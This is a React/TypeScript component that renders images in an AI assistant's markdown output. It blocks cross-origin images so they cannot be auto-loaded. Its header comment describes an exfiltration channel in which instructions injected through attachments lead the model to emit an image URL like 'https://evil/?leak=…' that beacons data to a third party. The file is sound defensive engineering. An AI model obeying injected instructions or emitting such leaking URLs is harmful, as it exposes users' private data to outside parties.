import type React from "react";
import { ImageIcon } from "./icons";

/**
 * The `img` renderer for any assistant/agent markdown (the chat transcript and the
 * HITL prompt card). Cuts the exfil channel (DECISIONS 0347): attachment content can
 * carry instructions the model transcribes, so this output is untrusted, and a
 * `![](https://evil/?leak=…)` would beacon to a third party the instant it renders.
 *
 * A REMOTE (cross-origin http/https) image is never auto-loaded — it renders as an
 * inert click-to-open citation. The chat-pane CSP (`img-src 'self' data: blob:`) is
 * the hard backstop that refuses the fetch; this is the paired UX so a remote image
 * reads as a citation rather than a broken-image glyph. Our own images — same-origin,
 * `data:`, `blob:` — render as normal `<img>`.
 */
export function MarkdownImage({ src, alt, ...rest }: React.ImgHTMLAttributes<HTMLImageElement>) {
  const url = typeof src === "string" ? src : "";
  let local: boolean;
  if (url.startsWith("data:") || url.startsWith("blob:")) {
    local = true;
  } else {
    try {
      local = new URL(url, window.location.origin).origin === window.location.origin;
    } catch {
      /* unparsable → treat as remote, be strict */
      local = false;
    }
  }
  if (local) {
    return <img src={url} alt={alt ?? ""} {...rest} />;
  }
  const label = alt && alt.trim() !== "" ? alt : url;
  return (
    <a href={url} target="_blank" rel="noopener noreferrer" className="ain-remote-image" title={url}>
      <ImageIcon className="ain-remote-image__icon" />
      <span className="ain-remote-image__label">{label}</span>
    </a>
  );
}
